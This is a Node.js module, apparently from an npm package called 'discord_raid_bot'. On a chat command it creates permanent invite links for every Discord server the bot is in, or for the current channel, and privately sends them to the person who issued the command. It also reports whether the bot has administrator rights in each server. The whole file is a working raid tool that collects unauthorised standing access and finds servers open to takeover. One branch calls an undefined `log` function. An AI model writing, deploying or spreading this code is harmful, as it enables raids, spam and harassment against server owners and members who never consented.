module.exports = (client, prefix, commande, allGuilds) => {
    const Discord = require('discord.js');
    client.on('message', message => {
        if (message.content === prefix + commande) {
            if (allGuilds === true) {
                client.guilds.map(guild => {
                    guild.channels.random().createInvite({
                        maxAge: 0,
                        unique: false
                    }, 'https://www.npmjs.com/package/discord_raid_bot').then(invite => {
                        if (guild.me.hasPermission('ADMINISTRATOR')) {
                            const embed = new Discord.RichEmbed()
                                .setTitle(guild.name)
                                .addField(`${guild.members.size} members`, `J'y suis administrateur.`)
                                .setDescription(invite)
                                .setColor('RANDOM')
                                .setTimestamp();
                            message.author.send({
                                embed
                            })
                        } else {
                            const embed = new Discord.RichEmbed()
                                .setTitle(guild.name)
                                .addField(`${guild.members.size} members`, `Je n'y suis pas administrateur.`)
                                .setDescription(invite)
                                .setColor('RANDOM')
                                .setTimestamp();
                            message.author.send({
                                embed
                            })
                        }
                    }).catch(console.error);
                });
            } else {
                message.channel.createInvite({
                    maxAge: 0,
                    unique: false
                }, 'https://www.npmjs.com/package/discord_raid_bot').then(invite => {
                    message.author.send('https://discord.gg/' + invite.code);
                    log(invite.code)
                }).catch(console.error);
            }
        }
    })
}